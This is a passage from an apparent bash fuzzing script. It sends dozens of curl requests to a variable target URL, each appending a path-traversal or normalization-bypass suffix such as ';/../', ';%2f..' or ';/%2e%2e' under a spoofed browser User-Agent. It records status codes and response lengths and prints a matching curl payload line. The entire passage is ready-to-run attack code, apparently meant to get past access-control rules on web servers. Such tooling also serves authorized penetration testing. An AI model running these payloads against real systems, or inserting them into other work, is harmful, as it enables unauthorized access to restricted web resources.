  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%09" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%09' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%09.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%09..' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%09..;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%09..;' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%09;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%09;' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2F.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2F..' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f%2e%2e" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f%%%%2e%%%%2e' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f%2e%2e%2f%2e%2e%2f%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f%%%%2e%%%%2e%%%%2f%%%%2e%%%%2e%%%%2f%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f%2f/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f%%%%2f/../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f..' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..%2f%2e%2e%2f%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f..%%%%2f%%%%2e%%%%2e%%%%2f%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..%2f..%2f%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f..%%%%2f..%%%%2f%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..%2f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f..%%%%2f/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..%2f/..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f..%%%%2f/..%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..%2f/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f..%%%%2f/../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f../%2f..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f../%%%%2f..%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f../%2f../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f../%%%%2f../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..//..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f..//..%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..//../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f..//../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..///" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f..///' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..///;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f..///;' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..//;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f..//;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..//;/;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f..//;/;' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f../;//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f../;//' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f../;/;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f../;/;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f../;/;/;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f../;/;/;' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..;///" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f..;///' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..;//;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f..;//;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..;/;//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f..;/;//' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f/%2f../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f/%%%%2f../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f//..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f//..%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f//../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f//../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f//..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f//..;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f/;/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f/;/../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f/;/..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f/;/..;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f;//../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f;//../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f;/;/..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};%%%%2f;/;/..;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/%2e%2e" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/%%%%2e%%%%2e' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/%2e%2e%2f%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/%%%%2e%%%%2e%%%%2f%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/%2e%2e%2f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/%%%%2e%%%%2e%%%%2f/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/%2e%2e/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/%%%%2e%%%%2e/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/%2e." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/%%%%2e.' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/%2f%2f../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/%%%%2f%%%%2f../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/%2f/..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/%%%%2f/..%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/%2f/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/%%%%2f/../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/.%2e" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/.%%%%2e' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/.%2e/%2e%2e/%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/.%%%%2e/%%%%2e%%%%2e/%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/..' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/..%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..%2f%2f../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/..%%%%2f%%%%2f../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..%2f..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/..%%%%2f..%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..%2f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/..%%%%2f/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..%2f//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/..%%%%2f//' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/../%2f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/../%%%%2f/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/../../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/../../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/../..//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/../..//' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/.././../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/.././../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/../.;/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/../.;/../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/..//' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..//%2e%2e/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/..//%%%%2e%%%%2e/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..//%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/..//%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..//../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/..//../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..///" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/..///' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/../;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/../;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/../;/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/../;/../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/..;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/..;' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/.;." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};/.;.' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};//%2f../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};//%%%%2f../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};//.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};//..' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};//../../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target};//../../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
